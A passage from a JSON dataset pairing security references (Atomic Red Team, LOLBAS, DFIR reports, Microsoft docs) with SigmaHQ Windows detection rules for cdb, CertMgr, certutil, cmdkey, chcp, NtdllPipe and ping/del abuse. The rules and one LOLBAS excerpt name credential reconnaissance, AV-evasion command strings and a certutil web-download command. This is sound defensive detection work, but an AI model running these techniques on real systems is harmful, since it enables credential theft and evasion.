        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cdb.exe"
          },
          {
            "OriginalFileName": "CDB.Exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            " -c ",
            " -cf "
          ]
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Legitimate use of debugging tools"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cdb_arbitrary_command_execution.yml"
  },
  "94": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md",
    "markdown": "# T1553.004 - Install Root Certificate ## Description from ATT&CK Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a",
    "sigma_rule": {
      "title": "New Root Certificate Installed Via CertMgr.EXE",
      "id": "ff992eac-6449-4c60-8c1d-91c9722a1d48",
      "related": [
        {
          "id": "42821614-9264-4761-acfc-5772c3286f76",
          "type": "derived"
        },
        {
          "id": "46591fae-7a4c-46ea-aec3-dff5e6d785dc",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"certmgr\" with the \"add\" flag in order to install a new certificate on the system.\nAdversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md",
        "https://securelist.com/to-crypt-or-to-mine-that-is-the-question/86307/"
      ],
      "author": "oscd.community, @redcanary, Zach Stanford @svch0st",
      "date": "2023-03-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1553.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\CertMgr.exe"
          },
          {
            "OriginalFileName": "CERTMGT.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "/add",
            "root"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to test if GPO push doesn't trigger FP"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_certmgr_certificate_installation.yml"
  },
  "95": {
    "url": "https://securelist.com/to-crypt-or-to-mine-that-is-the-question/86307/",
    "markdown": "# To crypt, or to mine – that is the question **Research** **05 Jul 2018** --- Way back in 2013 our malware analysts spotted the first malicious samples related to the Trojan-Ransom.Win32.Rakhni family. That was the starting point for this long-lived Trojan family, which is still functioning to this day. During that time the malware writers have changed: - the way their Trojans get keys (from locally generated to received from the C&C); - the algorithms used (from using only a symmetric algorithm, through a commonly used scheme of symmetric + asymmetric, to 18 symmetric algorithms used simultaneously); - the",
    "sigma_rule": {
      "title": "New Root Certificate Installed Via CertMgr.EXE",
      "id": "ff992eac-6449-4c60-8c1d-91c9722a1d48",
      "related": [
        {
          "id": "42821614-9264-4761-acfc-5772c3286f76",
          "type": "derived"
        },
        {
          "id": "46591fae-7a4c-46ea-aec3-dff5e6d785dc",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects execution of \"certmgr\" with the \"add\" flag in order to install a new certificate on the system.\nAdversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1553.004/T1553.004.md",
        "https://securelist.com/to-crypt-or-to-mine-that-is-the-question/86307/"
      ],
      "author": "oscd.community, @redcanary, Zach Stanford @svch0st",
      "date": "2023-03-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1553.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\CertMgr.exe"
          },
          {
            "OriginalFileName": "CERTMGT.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "/add",
            "root"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Help Desk or IT may need to manually add a corporate Root CA on occasion. Need to test if GPO push doesn't trigger FP"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_certmgr_certificate_installation.yml"
  },
  "96": {
    "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil",
    "markdown": "# certutil ## Article **Date:** 10/19/2023 **Contributors:** 20 contributors ### Applies to: - ✅ Windows Server 2025 - ✅ Windows Server 2022 - ✅ Windows Server 2019 - ✅ Windows Server 2016 - ✅ Windows 11 - ✅ Windows 10 - ✅ Azure Stack HCI, versions 23H2 and 22H2 ### Caution `Certutil` isn't recommended to be used in any production code and doesn't provide any guarantees of live site support or application compatibilities. It's a tool utilized by developers and IT administrators to view certificate content information on devices. `Certutil.exe` is a command-line program installed as part of Certificate Services.",
    "sigma_rule": {
      "title": "File Encoded To Base64 Via Certutil.EXE",
      "id": "e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a",
      "status": "test",
      "description": "Detects the execution of certutil with the \"encode\" flag to encode a file to base64. This can be abused by threat actors and attackers for data exfiltration",
      "references": [
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil",
        "https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/",
        "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
      ],
      "author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-02-24",
      "modified": "2024-03-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1027"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\certutil.exe"
          },
          {
            "OriginalFileName": "CertUtil.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": "-encode"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "As this is a general purpose rule, legitimate usage of the encode functionality will trigger some false positives. Apply additional filters accordingly"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_certutil_encode.yml"
  },
  "97": {
    "url": "https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/",
    "markdown": "# New BabyShark Malware Targets U.S. National Security Think Tanks **Malware** ## Related Products - Advanced Threat Prevention - Advanced WildFire - Cortex XDR **Published:** February 22, 2019 **Categories:** Malware, Nation-State Cyberattacks, Threat Research **Tags:** BabyShark, KimJongRAT, STOLEN PENCIL --- In February 2019, Palo Alto Networks Unit 42 researchers identified spear phishing emails sent in November 2018 containing new malware that shares infrastructure with playbooks associated with North Korean campaigns. The spear phishing emails were written to appear as though they were sent from a nuclear security expert who currently works as a consultant in the U.S. The emails were",
    "sigma_rule": {
      "title": "File Encoded To Base64 Via Certutil.EXE",
      "id": "e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a",
      "status": "test",
      "description": "Detects the execution of certutil with the \"encode\" flag to encode a file to base64. This can be abused by threat actors and attackers for data exfiltration",
      "references": [
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil",
        "https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/",
        "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
      ],
      "author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-02-24",
      "modified": "2024-03-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1027"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\certutil.exe"
          },
          {
            "OriginalFileName": "CertUtil.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": "-encode"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "As this is a general purpose rule, legitimate usage of the encode functionality will trigger some false positives. Apply additional filters accordingly"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_certutil_encode.yml"
  },
  "98": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Certutil/",
    "markdown": "# /Certutil.exe Windows binary used for handling certificates ### Paths: - C:\\Windows\\System32\\certutil.exe - C:\\Windows\\SysWOW64\\certutil.exe ### Resources: - https://twitter.com/Moriarty_Meng/status/984380793383370752 - https://twitter.com/mattifestation/status/620107926288515072 - https://twitter.com/egre55/status/1087685529016193025 ### Detections: - Sigma: proc_creation_win_certutil_download.yml - Sigma: proc_creation_win_certutil_encode.yml - Sigma: proc_creation_win_certutil_decode.yml - Elastic: defense_evasion_suspicious_certutil_commands.toml - Elastic: command_and_control_certutil_network_connection.toml - Splunk: certutil_download_with_urlcache_and_split_arguments.yml - Splunk: certutil_download_with_verifyctl_and_split_arguments.yml - Splunk: certutil_with_decode_argument.yml - IOC: Certutil.exe creating new files on disk - IOC: Useragent Microsoft-CryptoAPI/10.0 - IOC: Useragent CertUtil URL Agent ## Download 1. Download and save 7zip to disk in the current folder. ``` certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe ``` **Use case:** Download file from Internet **Privileges required:** User **Operating systems:** Windows vista,",
    "sigma_rule": {
      "title": "File Encoded To Base64 Via Certutil.EXE",
      "id": "e62a9f0c-ca1e-46b2-85d5-a6da77f86d1a",
      "status": "test",
      "description": "Detects the execution of certutil with the \"encode\" flag to encode a file to base64. This can be abused by threat actors and attackers for data exfiltration",
      "references": [
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil",
        "https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/",
        "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
      ],
      "author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-02-24",
      "modified": "2024-03-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1027"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\certutil.exe"
          },
          {
            "OriginalFileName": "CertUtil.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": "-encode"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "As this is a general purpose rule, legitimate usage of the encode functionality will trigger some false positives. Apply additional filters accordingly"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_certutil_encode.yml"
  },
  "99": {
    "url": "https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/",
    "markdown": "# Stolen Images Campaign Ends in Conti Ransomware **Categories:** adfind cobaltstrike conti exploit icedid ransomware **Published on:** April 4, 2022 --- In this intrusion from December 2021, the threat actors utilized IcedID as the initial access vector. IcedID is a banking trojan that first appeared in 2017, usually delivered via malspam campaigns and has been widely used as an initial access vector in multiple ransomware intrusions. Upon execution of the IcedID DLL, discovery activity was performed which was followed by the dropping of a Cobalt Strike beacon on the infected host. Along the way, the threat actors installed remote management",
    "sigma_rule": {
      "title": "Console CodePage Lookup Via CHCP",
      "id": "7090adee-82e2-4269-bd59-80691e7c6338",
      "status": "test",
      "description": "Detects use of chcp to look up the system locale value as part of host discovery",
      "references": [
        "https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp"
      ],
      "author": "_pete_0, TheDFIRReport",
      "date": "2022-02-21",
      "modified": "2024-03-05",
      "tags": [
        "attack.discovery",
        "attack.t1614.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\cmd.exe",
          "ParentCommandLine|contains|windash": [
            " -c ",
            " -r ",
            " -k "
          ],
          "Image|endswith": "\\chcp.com",
          "CommandLine|endswith": [
            "chcp",
            "chcp ",
            "chcp  "
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "During Anaconda update the 'conda.exe' process will eventually execution the 'chcp' command.",
        "Discord was seen using chcp to look up code pages"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_chcp_codepage_lookup.yml"
  },
  "100": {
    "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp",
    "markdown": "# chcp Changes the active console code page. If used without parameters, **chcp** displays the number of the active console code page. ## Syntax ``` chcp [<nnn>] ``` ## Parameters | Parameter | Description | |-----------|-------------| | `<nnn>` | Specifies the code page. | | `/?` | Displays help at the command prompt. | The following table lists each supported code page and its country/region or language: | Code page | Country/region or language | |-----------|----------------------------| | 437 | United States | | 850 | Multilingual (Latin I) | | 852 | Slavic (Latin II) | | 855 | Cyrillic",
    "sigma_rule": {
      "title": "Console CodePage Lookup Via CHCP",
      "id": "7090adee-82e2-4269-bd59-80691e7c6338",
      "status": "test",
      "description": "Detects use of chcp to look up the system locale value as part of host discovery",
      "references": [
        "https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/",
        "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp"
      ],
      "author": "_pete_0, TheDFIRReport",
      "date": "2022-02-21",
      "modified": "2024-03-05",
      "tags": [
        "attack.discovery",
        "attack.t1614.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\cmd.exe",
          "ParentCommandLine|contains|windash": [
            " -c ",
            " -r ",
            " -k "
          ],
          "Image|endswith": "\\chcp.com",
          "CommandLine|endswith": [
            "chcp",
            "chcp ",
            "chcp  "
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "During Anaconda update the 'conda.exe' process will eventually execution the 'chcp' command.",
        "Discord was seen using chcp to look up code pages"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_chcp_codepage_lookup.yml"
  },
  "101": {
    "url": "https://web.archive.org/web/20230130005118/https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation",
    "markdown": "# Exploring cmdkey: An Edge Case for Privilege Escalation **Date:** November 29, 2017 **Tags:** Red Team, Privilege Escalation I was recently exploring methods of caching cleartext credentials on Windows systems for a pentest lab when I ran into an interesting tool, `cmdkey.exe`. Cmdkey is a built-in Windows tool that can cache domain user credentials for use on specific target machines. You can check out the documentation from Microsoft here: https://technet.microsoft.com/en-us/library/cc754243(v=ws.11).aspx.aspx). While cmdkey didn’t quite suit my criteria for pentest labs, it had a few characteristics that piqued my interest: - You can list and create credentials w/ cmdkey as a",
    "sigma_rule": {
      "title": "Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE",
      "id": "07f8bdc2-c9b3-472a-9817-5a670b872f53",
      "status": "test",
      "description": "Detects usage of cmdkey to look for cached credentials on the system",
      "references": [
        "https://web.archive.org/web/20230130005118/https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation",
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754243(v=ws.11)",
        "https://github.com/redcanaryco/atomic-red-team/blob/b27a3cb25025161d49ac861cb216db68c46a3537/atomics/T1003.005/T1003.005.md#atomic-test-1---cached-credential-dump-via-cmdkey"
      ],
      "author": "jmallette, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-01-16",
      "modified": "2024-03-05",
      "tags": [
        "attack.credential-access",
        "attack.t1003.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cmdkey.exe"
          },
          {
            "OriginalFileName": "cmdkey.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": " -l"
        },
        "condition": "all of selection*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine",
        "User"
      ],
      "falsepositives": [
        "Legitimate administrative tasks"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmdkey_recon.yml"
  },
  "102": {
    "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754243(v=ws.11)",
    "markdown": "# Cmdkey **Applies To**: Windows Vista, Windows Server 2008, Windows Server 2012, Windows 8 Creates, lists, and deletes stored user names and passwords or credentials. For examples of how this command can be used, see Examples. ## Syntax ``` cmdkey [{/add:<TargetName>|/generic:<TargetName>}] {/smartcard|/user:<UserName> [/pass:<Password>]} [/delete{:<TargetName>|/ras}] /list:<TargetName> ``` ## Parameters | Parameters | Description | |--------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------| | `/add:<TargetName>` | Adds a user name and password to the list. Requires the parameter of `<TargetName>` which identifies the computer or domain name that this entry will be associated with. | | `/generic:<TargetName>` | Adds generic credentials to the list. Requires the parameter of `<TargetName>`",
    "sigma_rule": {
      "title": "Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE",
      "id": "07f8bdc2-c9b3-472a-9817-5a670b872f53",
      "status": "test",
      "description": "Detects usage of cmdkey to look for cached credentials on the system",
      "references": [
        "https://web.archive.org/web/20230130005118/https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation",
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754243(v=ws.11)",
        "https://github.com/redcanaryco/atomic-red-team/blob/b27a3cb25025161d49ac861cb216db68c46a3537/atomics/T1003.005/T1003.005.md#atomic-test-1---cached-credential-dump-via-cmdkey"
      ],
      "author": "jmallette, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-01-16",
      "modified": "2024-03-05",
      "tags": [
        "attack.credential-access",
        "attack.t1003.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cmdkey.exe"
          },
          {
            "OriginalFileName": "cmdkey.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": " -l"
        },
        "condition": "all of selection*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine",
        "User"
      ],
      "falsepositives": [
        "Legitimate administrative tasks"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmdkey_recon.yml"
  },
  "103": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/b27a3cb25025161d49ac861cb216db68c46a3537/atomics/T1003.005/T1003.005.md#atomic-test-1---cached-credential-dump-via-cmdkey",
    "markdown": "# T1003.005 - OS Credential Dumping: Cached Domain Credentials ## Description from ATT&CK Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable. (Citation: Microsoft - Cached Creds) On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash. (Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password. (Citation: ired mscache) With",
    "sigma_rule": {
      "title": "Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE",
      "id": "07f8bdc2-c9b3-472a-9817-5a670b872f53",
      "status": "test",
      "description": "Detects usage of cmdkey to look for cached credentials on the system",
      "references": [
        "https://web.archive.org/web/20230130005118/https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation",
        "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754243(v=ws.11)",
        "https://github.com/redcanaryco/atomic-red-team/blob/b27a3cb25025161d49ac861cb216db68c46a3537/atomics/T1003.005/T1003.005.md#atomic-test-1---cached-credential-dump-via-cmdkey"
      ],
      "author": "jmallette, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-01-16",
      "modified": "2024-03-05",
      "tags": [
        "attack.credential-access",
        "attack.t1003.005"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cmdkey.exe"
          },
          {
            "OriginalFileName": "cmdkey.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|windash": " -l"
        },
        "condition": "all of selection*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine",
        "User"
      ],
      "falsepositives": [
        "Legitimate administrative tasks"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmdkey_recon.yml"
  },
  "104": {
    "url": "https://thedfirreport.com/2022/09/26/bumblebee-round-two/",
    "markdown": "# BumbleBee: Round Two **Categories:** adfind, bumblebee, cobaltstrike, Meterpreter **Published on:** September 26, 2022 In this intrusion from May 2022, the threat actors used BumbleBee as the initial access vector. BumbleBee has been identified as an initial access vector utilized by several ransomware affiliates. In this intrusion, we see the threat actor use BumbleBee to deploy Cobalt Strike and Meterpreter. The threat actor then used RDP and SMB to move around the network looking at backup systems and file shares before being evicted from the network. ## Case Summary The intrusion began with the delivery of an ISO file containing",
    "sigma_rule": {
      "title": "Copy .DMP/.DUMP Files From Remote Share Via Cmd.EXE",
      "id": "044ba588-dff4-4918-9808-3f95e8160606",
      "status": "test",
      "description": "Detects usage of the copy builtin cmd command to copy files with the \".dmp\"/\".dump\" extension from a remote share",
      "references": [
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-27",
      "modified": "2023-09-12",
      "tags": [
        "attack.credential-access"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cmd.exe"
          },
          {
            "OriginalFileName": "Cmd.Exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "copy ",
            " \\\\\\\\"
          ],
          "CommandLine|contains": [
            ".dmp",
            ".dump",
            ".hdmp"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmd_copy_dmp_from_share.yml"
  },
  "105": {
    "url": "https://web.archive.org/web/20220306121156/https://www.x86matthew.com/view_post?id=ntdll_pipe",
    "markdown": "# NtdllPipe - Using cmd.exe to retrieve a clean version of ntdll.dll **Posted:** **04/03/2022** I was recently using a computer that had AV software installed which injected user-mode hooks into various functions within `ntdll.dll`. I'm out of touch with how modern AV software operates, so I decided to see how easy this was to overcome. The most obvious method would be to read `ntdll.dll` from the disk using `CreateFile` and `ReadFile`, but this triggers the AV heuristics engine as suspected. My next idea was to use a trusted Microsoft executable to do the job for me - one candidate being",
    "sigma_rule": {
      "title": "NtdllPipe Like Activity Execution",
      "id": "bbc865e4-7fcd-45a6-8ff1-95ced28ec5b2",
      "status": "test",
      "description": "Detects command that type the content of ntdll.dll to a different file or a pipe in order to evade AV / EDR detection. As seen being used in the POC NtdllPipe",
      "references": [
        "https://web.archive.org/web/20220306121156/https://www.x86matthew.com/view_post?id=ntdll_pipe"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-03-05",
      "modified": "2023-03-07",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "type %windir%\\system32\\ntdll.dll",
            "type %systemroot%\\system32\\ntdll.dll",
            "type c:\\windows\\system32\\ntdll.dll",
            "\\\\ntdll.dll > \\\\\\\\.\\\\pipe\\\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmd_ntdllpipe_redirect.yml"
  },
  "106": {
    "url": "https://blog.sygnia.co/kaseya-ransomware-supply-chain-attack",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Ping/Del Command Combination",
      "id": "54786ddc-5b8a-11ed-9b6a-0242ac120002",
      "status": "test",
      "description": "Detects a method often used by ransomware. Which combines the \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question. Its used to hide the file responsible for the initial infection for example",
      "references": [
        "https://blog.sygnia.co/kaseya-ransomware-supply-chain-attack",
        "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/06/23093553/Common-TTPs-of-the-modern-ransomware_low-res.pdf",
        "https://www.acronis.com/en-us/blog/posts/lockbit-ransomware/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackbyte-exbyte-ransomware"
      ],
      "author": "Ilya Krestinichev",
      "date": "2022-11-03",
      "modified": "2024-03-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_count": {
          "CommandLine|contains|windash": " -n "
        },
        "selection_nul": {
          "CommandLine|contains": "Nul"
        },
        "selection_del_param": {
          "CommandLine|contains|windash": [
            " -f ",
            " -q "
          ]
        },
        "selection_all": {
          "CommandLine|contains|all": [
            "ping",
            "del "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmd_ping_del_combined_execution.yml"
  },
  "107": {
    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/06/23093553/Common-TTPs-of-the-modern-ransomware_low-res.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Ping/Del Command Combination",
      "id": "54786ddc-5b8a-11ed-9b6a-0242ac120002",
      "status": "test",
      "description": "Detects a method often used by ransomware. Which combines the \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question. Its used to hide the file responsible for the initial infection for example",
      "references": [
        "https://blog.sygnia.co/kaseya-ransomware-supply-chain-attack",
        "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/06/23093553/Common-TTPs-of-the-modern-ransomware_low-res.pdf",
        "https://www.acronis.com/en-us/blog/posts/lockbit-ransomware/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackbyte-exbyte-ransomware"
      ],
      "author": "Ilya Krestinichev",
      "date": "2022-11-03",
      "modified": "2024-03-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_count": {
          "CommandLine|contains|windash": " -n "
        },
        "selection_nul": {
          "CommandLine|contains": "Nul"
        },
        "selection_del_param": {
          "CommandLine|contains|windash": [
            " -f ",
            " -q "
          ]
        },
        "selection_all": {
          "CommandLine|contains|all": [
            "ping",
            "del "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmd_ping_del_combined_execution.yml"
  },
  "108": {
    "url": "https://www.acronis.com/en-us/blog/posts/lockbit-ransomware/",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Ping/Del Command Combination",
      "id": "54786ddc-5b8a-11ed-9b6a-0242ac120002",
      "status": "test",
      "description": "Detects a method often used by ransomware. Which combines the \"ping\" to wait a couple of seconds and then \"del\" to delete the file in question. Its used to hide the file responsible for the initial infection for example",
      "references": [
        "https://blog.sygnia.co/kaseya-ransomware-supply-chain-attack",
        "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/06/23093553/Common-TTPs-of-the-modern-ransomware_low-res.pdf",
        "https://www.acronis.com/en-us/blog/posts/lockbit-ransomware/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackbyte-exbyte-ransomware"
      ],
      "author": "Ilya Krestinichev",
      "date": "2022-11-03",
      "modified": "2024-03-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1070.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_count": {
          "CommandLine|contains|windash": " -n "
        },
        "selection_nul": {
          "CommandLine|contains": "Nul"
        },
        "selection_del_param": {
          "CommandLine|contains|windash": [
            " -f ",
            " -q "
          ]
        },
        "selection_all": {
          "CommandLine|contains|all": [
            "ping",
            "del "
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_cmd_ping_del_combined_execution.yml"
  },
  "109": {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackbyte-exbyte-ransomware",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Ping/Del Command Combination",
